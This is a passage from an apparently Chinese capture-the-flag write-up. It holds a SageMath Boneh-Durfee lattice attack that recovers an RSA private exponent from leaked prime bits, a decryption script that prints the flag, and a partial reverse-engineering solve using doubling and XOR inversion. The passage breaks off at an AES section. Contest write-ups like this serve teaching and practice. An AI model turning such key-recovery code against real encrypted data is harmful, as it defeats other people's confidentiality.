class=\"line\">    <span class=\"comment\"># 单项式 x 移位列表</span></span><br><span class=\"line\">    monomials = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> polynomial <span class=\"keyword\">in</span> gg:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> monomial <span class=\"keyword\">in</span> polynomial.monomials(): <span class=\"comment\">#对于多项式中的单项式。单项式（）：</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> monomial <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> monomials:  <span class=\"comment\"># 如果单项不在单项中</span></span><br><span class=\"line\">                monomials.append(monomial)</span><br><span class=\"line\">    monomials.sort()</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># y-移位</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> jj <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, tt + <span class=\"number\">1</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> kk <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(floor(mm/tt) * jj, mm + <span class=\"number\">1</span>):</span><br><span class=\"line\">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class=\"line\">            yshift = Q(yshift).lift()</span><br><span class=\"line\">            gg.append(yshift) <span class=\"comment\"># substitution</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># 单项式 y 移位列表</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> jj <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, tt + <span class=\"number\">1</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> kk <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(floor(mm/tt) * jj, mm + <span class=\"number\">1</span>):</span><br><span class=\"line\">            monomials.append(u^kk * y^jj)</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># 构造格 B</span></span><br><span class=\"line\">    nn = <span class=\"built_in\">len</span>(monomials)</span><br><span class=\"line\">    BB = Matrix(ZZ, nn)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ii <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(nn):</span><br><span class=\"line\">        BB[ii, <span class=\"number\">0</span>] = gg[ii](<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> jj <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, ii + <span class=\"number\">1</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> monomials[jj] <span class=\"keyword\">in</span> gg[ii].monomials():</span><br><span class=\"line\">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">#约化格的原型</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> helpful_only:</span><br><span class=\"line\">        <span class=\"comment\">#  #自动删除</span></span><br><span class=\"line\">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 重置维度</span></span><br><span class=\"line\">        nn = BB.dimensions()[<span class=\"number\">0</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> nn == <span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span> (<span class=\"string\">&quot;failure&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>,<span class=\"number\">0</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># 检查向量是否有帮助</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> debug:</span><br><span class=\"line\">        helpful_vectors(BB, modulus^mm)</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># 检查行列式是否正确界定</span></span><br><span class=\"line\">    det = BB.det()</span><br><span class=\"line\">    bound = modulus^(mm*nn)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> det &gt;= bound:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> (<span class=\"string\">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span> (<span class=\"string\">&quot;Try with highers m and t.&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> debug:</span><br><span class=\"line\">            diff = (log(det) - log(bound)) / log(<span class=\"number\">2</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span> (<span class=\"string\">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> strict:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> -<span class=\"number\">1</span>, -<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> (<span class=\"string\">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># display the lattice basis</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> debug:</span><br><span class=\"line\">        matrix_overview(BB, modulus^mm)</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># LLL</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> debug:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> (<span class=\"string\">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">#BB = BB.BKZ(block_size=25)</span></span><br><span class=\"line\">    BB = BB.LLL()</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span> debug:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> (<span class=\"string\">&quot;LLL is done!&quot;</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># 替换向量 i 和 j -&gt;多项式 1 和 2</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> debug:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> (<span class=\"string\">&quot;在格中寻找线性无关向量&quot;</span>)</span><br><span class=\"line\">    found_polynomials = <span class=\"literal\">False</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">for</span> pol1_idx <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(nn - <span class=\"number\">1</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> pol2_idx <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(pol1_idx + <span class=\"number\">1</span>, nn):</span><br><span class=\"line\"> </span><br><span class=\"line\">            <span class=\"comment\"># 对于i and j, 构造两个多项式</span></span><br><span class=\"line\"> </span><br><span class=\"line\">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class=\"line\">            pol1 = pol2 = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> jj <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(nn):</span><br><span class=\"line\">                pol1 += monomials[jj](w*z+<span class=\"number\">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class=\"line\">                pol2 += monomials[jj](w*z+<span class=\"number\">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class=\"line\"> </span><br><span class=\"line\">            <span class=\"comment\"># 结果</span></span><br><span class=\"line\">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class=\"line\">            rr = pol1.resultant(pol2)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">            <span class=\"keyword\">if</span> rr.is_zero() <span class=\"keyword\">or</span> rr.monomials() == [<span class=\"number\">1</span>]:</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span> (<span class=\"string\">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class=\"string\">&quot;and&quot;</span>, pol2_idx)</span><br><span class=\"line\">                found_polynomials = <span class=\"literal\">True</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> found_polynomials:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> found_polynomials:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> (<span class=\"string\">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    rr = rr(q, q)</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># solutions</span></span><br><span class=\"line\">    soly = rr.roots()</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(soly) == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> (<span class=\"string\">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    soly = soly[<span class=\"number\">0</span>][<span class=\"number\">0</span>]</span><br><span class=\"line\">    ss = pol1(q, soly)</span><br><span class=\"line\">    solx = ss.roots()[<span class=\"number\">0</span>][<span class=\"number\">0</span>]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> solx, soly</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">example</span>():</span><br><span class=\"line\">    <span class=\"comment\">##################################################################</span></span><br><span class=\"line\">    <span class=\"comment\"># 随机生成数据</span></span><br><span class=\"line\">    <span class=\"comment\">###############################################################</span></span><br><span class=\"line\">    <span class=\"comment\">#start_time =time.perf_counter</span></span><br><span class=\"line\">    start =time.clock()</span><br><span class=\"line\">    size=<span class=\"number\">512</span></span><br><span class=\"line\">    length_N = <span class=\"number\">2</span>*size;</span><br><span class=\"line\">    ss=<span class=\"number\">0</span></span><br><span class=\"line\">    s=<span class=\"number\">70</span>;</span><br><span class=\"line\">    M=<span class=\"number\">1</span>   <span class=\"comment\"># the number of experiments</span></span><br><span class=\"line\">    delta = <span class=\"number\">299</span>/<span class=\"number\">1024</span></span><br><span class=\"line\">    <span class=\"comment\"># p =  random_prime(2^512,2^511)</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(M):</span><br><span class=\"line\"><span class=\"comment\">#         p =  random_prime(2^size,None,2^(size-1))</span></span><br><span class=\"line\"><span class=\"comment\">#         q =  random_prime(2^size,None,2^(size-1))</span></span><br><span class=\"line\"><span class=\"comment\">#         if(p&lt;q):</span></span><br><span class=\"line\"><span class=\"comment\">#             temp=p</span></span><br><span class=\"line\"><span class=\"comment\">#             p=q</span></span><br><span class=\"line\"><span class=\"comment\">#             q=temp</span></span><br><span class=\"line\">        <span class=\"comment\">#N = 69207225407236621802315929835231678761546030648552499878532449478584182354765750349071726491300234635799981022731725455349420914234822062855723904939138000102040435210706843712478106458961468791872716857992483073814316706027260218386995042614451566024972455009936823034721213885693157803402838690192435869721</span></span><br><span class=\"line\">        N = <span class=\"number\">95987463597889741532025162535631829592517704738860431905943824498597890101136796870879646153634795544527837591685182170270252555997933421564167468816667980089869165228796395618775798781717091178143300536302805947806332962230499807469654672313206953750808878098101882367253566423367338396717229488061237787619</span></span><br><span class=\"line\">        e = <span class=\"number\">12761568528114005244342182138319275328501544878744699681091257281459893043102455333575012392492554249378138377894473691530001400901111860569849400611145049669197371290112261284014768486937294128410391332641648640840309135718123516725634190495261570498188176102281061084366456374907755950527213961595506707585</span></span><br><span class=\"line\">        c = <span class=\"number\">35154471719082941146017277238175991504655570882040897713927696748547265178059291385527810510087300325678561502592029686486144851647754163110759942860051150957340793828236482243293747881251009434747066136505663782280758979333019882382608002308773317613847702048959887017010151916544703971113441862351668075919</span></span><br><span class=\"line\">        hint1 = <span class=\"number\">1175980694459189065778</span></span><br><span class=\"line\">        hint2 = <span class=\"number\">632846170973644915854</span></span><br><span class=\"line\"><span class=\"comment\">#         print (&quot;p真实高&quot;,s,&quot;比特：&quot;, int(p/2^(512-s)))</span></span><br><span class=\"line\"><span class=\"comment\">#         print (&quot;q真实高&quot;,s,&quot;比特：&quot;, int(q/2^(512-s)))</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">#         N = p*q;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># 解密指数d的指数( 最大0.292)</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">        m = <span class=\"number\">7</span>   <span class=\"comment\"># 格大小（越大越好/越慢）</span></span><br><span class=\"line\">        t = <span class=\"built_in\">round</span>(((<span class=\"number\">1</span>-<span class=\"number\">2</span>*delta) * m))  <span class=\"comment\"># 来自 Herrmann 和 May 的优化</span></span><br><span class=\"line\">        X = floor(N^delta)  <span class=\"comment\"># </span></span><br><span class=\"line\">        Y = floor(N^(<span class=\"number\">1</span>/<span class=\"number\">2</span>)/<span class=\"number\">2</span>^s)    <span class=\"comment\"># 如果 p、 q 大小相同，则正确</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> l <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">int</span>(hint1),<span class=\"built_in\">int</span>(hint1)+<span class=\"number\">1</span>):</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\n\\n\\n l=&#x27;</span>,l)</span><br><span class=\"line\">            pM=l;</span><br><span class=\"line\">            p0=pM*<span class=\"number\">2</span>^(size-s)+<span class=\"number\">2</span>^(size-s)-<span class=\"number\">1</span>;</span><br><span class=\"line\">            q0=N/p0;</span><br><span class=\"line\">            qM=<span class=\"built_in\">int</span>(q0/<span class=\"number\">2</span>^(size-s))</span><br><span class=\"line\">            A = N + <span class=\"number\">1</span>-pM*<span class=\"number\">2</span>^(size-s)-qM*<span class=\"number\">2</span>^(size-s);</span><br><span class=\"line\">        <span class=\"comment\">#A = N+1</span></span><br><span class=\"line\">            P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class=\"line\">            pol = <span class=\"number\">1</span> + x * (A + y)  <span class=\"comment\">#构建的方程</span></span><br><span class=\"line\"> </span><br><span class=\"line\">            <span class=\"comment\"># Checking bounds</span></span><br><span class=\"line\">            <span class=\"comment\">#if debug:</span></span><br><span class=\"line\">                <span class=\"comment\">#print (&quot;=== 核对数据 ===&quot;)</span></span><br><span class=\"line\">                <span class=\"comment\">#print (&quot;* delta:&quot;, delta)</span></span><br><span class=\"line\">                <span class=\"comment\">#print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292)</span></span><br><span class=\"line\">                <span class=\"comment\">#print (&quot;* size of e:&quot;, ceil(log(e)/log(2)))  # e的bit数</span></span><br><span class=\"line\">                <span class=\"comment\"># print (&quot;* size of N:&quot;, len(bin(N)))          # N的bit数</span></span><br><span class=\"line\">                <span class=\"comment\">#print (&quot;* size of N:&quot;, ceil(log(N)/log(2)))  # N的bit数</span></span><br><span class=\"line\">                <span class=\"comment\">#print (&quot;* m:&quot;, m, &quot;, t:&quot;, t)</span></span><br><span class=\"line\"> </span><br><span class=\"line\">            <span class=\"comment\"># boneh_durfee</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> debug:</span><br><span class=\"line\">                <span class=\"comment\">###print (&quot;=== running algorithm ===&quot;)</span></span><br><span class=\"line\">                start_time = time.time()</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">            solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">            <span class=\"keyword\">if</span> solx &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">                <span class=\"comment\">#print (&quot;=== solution found ===&quot;)</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"literal\">False</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span> (<span class=\"string\">&quot;x:&quot;</span>, solx)</span><br><span class=\"line\">                    <span class=\"built_in\">print</span> (<span class=\"string\">&quot;y:&quot;</span>, soly)</span><br><span class=\"line\"> </span><br><span class=\"line\">                d_sol = <span class=\"built_in\">int</span>(pol(solx, soly) / e)</span><br><span class=\"line\">                ss=ss+<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"built_in\">print</span> (<span class=\"string\">&quot;=== solution found ===&quot;</span>)</span><br><span class=\"line\">                <span class=\"built_in\">print</span> (<span class=\"string\">&quot;p的高比特为：&quot;</span>,l)</span><br><span class=\"line\">                <span class=\"built_in\">print</span> (<span class=\"string\">&quot;q的高比特为：&quot;</span>,qM)</span><br><span class=\"line\">                <span class=\"built_in\">print</span> (<span class=\"string\">&quot;d=&quot;</span>,d_sol) </span><br><span class=\"line\"> </span><br><span class=\"line\">            <span class=\"keyword\">if</span> debug:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))</span><br><span class=\"line\">            <span class=\"comment\">#break</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;ss=&quot;</span>,ss)</span><br><span class=\"line\">                            <span class=\"comment\">#end=time.process_time</span></span><br><span class=\"line\">        end=time.clock()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;Running time: %s Seconds&#x27;</span>%(end-start))</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    example()  </span><br></pre></td></tr></table></figure>\n<p>​\t\t得到了 d，然后解密：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">95987463597889741532025162535631829592517704738860431905943824498597890101136796870879646153634795544527837591685182170270252555997933421564167468816667980089869165228796395618775798781717091178143300536302805947806332962230499807469654672313206953750808878098101882367253566423367338396717229488061237787619</span></span><br><span class=\"line\">e = <span class=\"number\">12761568528114005244342182138319275328501544878744699681091257281459893043102455333575012392492554249378138377894473691530001400901111860569849400611145049669197371290112261284014768486937294128410391332641648640840309135718123516725634190495261570498188176102281061084366456374907755950527213961595506707585</span></span><br><span class=\"line\">c = <span class=\"number\">35154471719082941146017277238175991504655570882040897713927696748547265178059291385527810510087300325678561502592029686486144851647754163110759942860051150957340793828236482243293747881251009434747066136505663782280758979333019882382608002308773317613847702048959887017010151916544703971113441862351668075919</span></span><br><span class=\"line\">d = <span class=\"number\">994872951830622609173239108988480436496396666299008546372509127121113351371824434704770953</span></span><br><span class=\"line\"></span><br><span class=\"line\">m = <span class=\"built_in\">pow</span>(c,d,n)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(long_to_bytes(m).decode())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#wdflag&#123;a14a7fa0-4e7b-4624-ad0c-36c31dd8012e&#125;</span></span><br></pre></td></tr></table></figure>\n<p>crypto02：</p>\n<h1 id=\"reverse02\"><a class=\"markdownIt-Anchor\" href=\"#reverse02\">#</a> reverse02：</h1>\n<p>​\t\tflag 有四个部分，每个部分都有一个加密。</p>\n<p>​\t\t首先第一部分：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Enter the flag:&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( fgets(s, <span class=\"number\">41</span>, <span class=\"built_in\">stdin</span>) )</span><br><span class=\"line\">  s[<span class=\"built_in\">strcspn</span>(s, <span class=\"string\">&quot;\\n&quot;</span>)] = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( <span class=\"built_in\">strlen</span>(s) != <span class=\"number\">40</span> || <span class=\"built_in\">strncmp</span>(s, <span class=\"string\">&quot;wdflag&#123;&quot;</span>, <span class=\"number\">7uLL</span>) || v19[<span class=\"number\">32</span>] != <span class=\"number\">125</span> )</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>​\t\t输入 flag，然后技能高兴对比，进行比较， 首先是长度，之后就是 flag 的为 wdflag {XXXXXX} 格式。</p>\n<p>​\t\t第二部分：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">memcpy</span>(dest, v19, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">  v17[<span class=\"number\">8</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  s2[<span class=\"number\">0</span>] = <span class=\"number\">98</span>;</span><br><span class=\"line\">  s2[<span class=\"number\">1</span>] = <span class=\"number\">-54</span>;</span><br><span class=\"line\">  s2[<span class=\"number\">2</span>] = <span class=\"number\">-56</span>;</span><br><span class=\"line\">  s2[<span class=\"number\">3</span>] = <span class=\"number\">108</span>;</span><br><span class=\"line\">  s2[<span class=\"number\">4</span>] = <span class=\"number\">106</span>;</span><br><span class=\"line\">  s2[<span class=\"number\">5</span>] = <span class=\"number\">104</span>;</span><br><span class=\"line\">  s2[<span class=\"number\">6</span>] = <span class=\"number\">-54</span>;</span><br><span class=\"line\">  s2[<span class=\"number\">7</span>] = <span class=\"number\">-56</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">7</span>; ++i )</span><br><span class=\"line\">    s1[i] = <span class=\"number\">2</span> * dest[i];</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"built_in\">memcmp</span>(s1, s2, <span class=\"number\">8uLL</span>) )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<pre><code>\t看起来是一个乘积，解密得到第一部分：\n</code></pre>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># v11 = [0x6a,0xe,0x17,0x46,0x75,0xb,0x41,0x6]</span></span><br><span class=\"line\">v11 = [<span class=\"number\">98</span>,<span class=\"number\">202</span>,<span class=\"number\">200</span>,<span class=\"number\">108</span>,<span class=\"number\">106</span>,<span class=\"number\">104</span>,<span class=\"number\">202</span>,<span class=\"number\">200</span>]</span><br><span class=\"line\">a = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(v11)):</span><br><span class=\"line\">    a += <span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(v11[i]/<span class=\"number\">2</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(a)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#1ed654ed</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t第三段，就是个异或：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v21 = <span class=\"string\">&quot;XorrLord&quot;</span>;</span><br><span class=\"line\">  v11[<span class=\"number\">0</span>] = <span class=\"number\">0x6A</span>;</span><br><span class=\"line\">  v11[<span class=\"number\">1</span>] = <span class=\"number\">0xE</span>;</span><br><span class=\"line\">  v11[<span class=\"number\">2</span>] = <span class=\"number\">0x17</span>;</span><br><span class=\"line\">  v11[<span class=\"number\">3</span>] = <span class=\"number\">0x46</span>;</span><br><span class=\"line\">  v11[<span class=\"number\">4</span>] = <span class=\"number\">0x75</span>;</span><br><span class=\"line\">  v11[<span class=\"number\">5</span>] = <span class=\"number\">0xB</span>;</span><br><span class=\"line\">  v11[<span class=\"number\">6</span>] = <span class=\"number\">0x41</span>;</span><br><span class=\"line\">  v11[<span class=\"number\">7</span>] = <span class=\"number\">6</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( j = <span class=\"number\">8</span>; j &lt;= <span class=\"number\">15</span>; ++j )</span><br><span class=\"line\">    v12[j - <span class=\"number\">8</span>] = dest[j] ^ v21[j - <span class=\"number\">8</span>];</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"built_in\">memcmp</span>(v12, v11, <span class=\"number\">8uLL</span>) )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  base64_encode(&amp;v16, <span class=\"number\">8LL</span>, v10);</span><br><span class=\"line\">  v20 = <span class=\"string\">&quot;Ajc2AYK2Bjg&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"built_in\">strcmp</span>(v10, <span class=\"string\">&quot;Ajc2AYK2Bjg&quot;</span>) )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>​\t\t输入的数据需要和 XorrLord 进行异或操作，之后和 Ajc2AYKBjg 进行比较，脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v11 = [<span class=\"number\">0x6a</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x17</span>,<span class=\"number\">0x46</span>,<span class=\"number\">0x75</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x41</span>,<span class=\"number\">0x6</span>]</span><br><span class=\"line\">a = <span class=\"string\">&quot;XorrLord&quot;</span></span><br><span class=\"line\">b = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">lst = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">    lst.append(<span class=\"built_in\">ord</span>(i))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(a)):</span><br><span class=\"line\">    lst[i] = <span class=\"built_in\">chr</span>(v11[i] ^ <span class=\"built_in\">ord</span>(a[i]))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(b.join(lst))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#2ae49d3b</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t最后一个部分就是 AES 加密：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span 